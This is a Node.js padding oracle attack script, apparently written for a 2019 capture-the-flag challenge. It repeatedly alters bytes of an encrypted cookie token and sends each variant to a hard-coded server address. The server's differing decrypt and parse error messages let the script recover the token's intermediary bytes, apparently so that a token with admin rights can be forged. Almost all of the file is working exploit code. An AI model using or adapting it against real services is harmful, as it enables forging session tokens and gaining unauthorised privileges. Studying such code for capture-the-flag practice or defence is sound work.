const got = require('got')
const pAll = require('p-all')
const pad = require('left-pad')
const delay = require('delay')

const TOKEN = 'UGFkT3JhY2xlOml2L2NiY8O+7uQmXKFqNVUuI9c7VBe42FqRvernmQhsxyPnvxaF'
const ALL_HEX = Array.from(Array(256)).map((v, i) => pad(i.toString(16), 2, 0))
const BLOCK_SIZE = 16
const THROTTLE = 100

const MESSAGE_DECRYPT_ERROR = 'decrypt err~'
const MESSAGE_PARSE_ERROR = 'parse json err~'
const MESSAGE_ORIGINAL = '{"id":100,"roleAdmin":false}'

/**
 * e.g.:
 * ```
 * replace(Buffer.from('abcd'), 1, '7879')
 * // 'axyd'
 * replace(Buffer.from('abcd'), -2, '7879')
 * // 'abxy'
 */
function replace (buf, pos, hex) {
  let len = hex.length / 2
  let end = pos + len
  if (pos < 0) {
    return replace(buf, buf.length + pos, hex)
  }
  if (end > buf.length) {
    throw new Error('The replacement will overflow.')
  }
  return Buffer.from(buf).fill(hex, pos, end, 'hex')
}

async function verify (token) {
  let response = await got('http://116.85.48.104:5023/api/account_info', {
    headers: {
      host: 'c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com',
      cookie: `token=${token}`,
    },
    retry: 5,
  })
  return response.body
}

/**
 * https://www.freebuf.com/articles/web/15504.html
 * https://image.3001.net/uploads/image/20131028/20131028140812_51657.png
 */
async function findPadding (buf, position) {
  let results = {}
  await pAll(ALL_HEX.map((hex) => async () => {
    let modified = replace(buf, position, hex)
    // console.log('Modify [%d] to %s', position, hex)
    // console.log('Modified Result:', modified)
    let message = await verify(modified.toString('base64'))
    message = message.trim()
    console.log('Replacement Hex: %s\nResult:%s\n---', hex, message)
    // if (message !== MESSAGE_DECRYPT_ERR) {
    //   console.log('!-- AVAILABLE CHAR FOUND: 0x%s at %d --!', hex, position)
    // }
    results[message] = (results[message] || []).concat(hex)
    await delay(THROTTLE)
  }), { concurrency: 1 })
  console.log('Result:', results)
  return results
}

async function main () {
  let buf = Buffer.from(TOKEN, 'base64')
  console.log('Buffer: %s\n(Hex: %s)\nLength: %d\nBlock: %d\n(Block size: %d)', buf, buf.toString('hex'), buf.length, buf.length / BLOCK_SIZE, BLOCK_SIZE)

  const crackVectorAt = async (buf, block, index) => {
    const position =  BLOCK_SIZE * block + index
    console.log('Original Hex:', buf[position].toString(16))
    const results = await findPadding(buf, position)
    let matched
    if (results[MESSAGE_PARSE_ERROR] && results[MESSAGE_PARSE_ERROR].length === 1) {
      matched = results[MESSAGE_PARSE_ERROR][0]
    } else if (results[MESSAGE_ORIGINAL] && results[MESSAGE_ORIGINAL].length === 1) {
      matched = results[MESSAGE_ORIGINAL][0]
    } else {
      throw new Error('Cannot find the replacement hex')
    }
    let intermediary = parseInt(matched, 16) ^ (BLOCK_SIZE - index)
    let iv = intermediary ^ buf[index]
    return {
      intermediary,
      iv,
    }
  }

  const crackBlock = async (buf, block) => {
    let data = {}
    for (let padding = 1; padding <= BLOCK_SIZE; padding++) {
      let index = BLOCK_SIZE - padding
      let b = Buffer.from(buf)
      for (j = BLOCK_SIZE - 1; j > index; j--) {
        let hex = (padding ^ data[j].intermediary).toString(16)
        console.log('REPLACING', j, hex)
        b = replace(b, j, hex)
      }
      data[index] = await crackVectorAt(b, block, index)
      console.log('DATA', data[index])
      console.log('FULL DATA', JSON.stringify(data, null, 2))
    }
  }

  // await crackVectorAt(buf, 1, 15)
  await crackBlock(buf, 2)

  // await request(TOKEN)
  // let buf = Buffer.from(TOKEN, 'base64')
  // console.log(buf.toString('utf8'))
  // console.log(buf.toString('utf8').length)
  // console.log(buf.toString('hex'))
  // console.log(buf.toString('hex').length)
}

main()
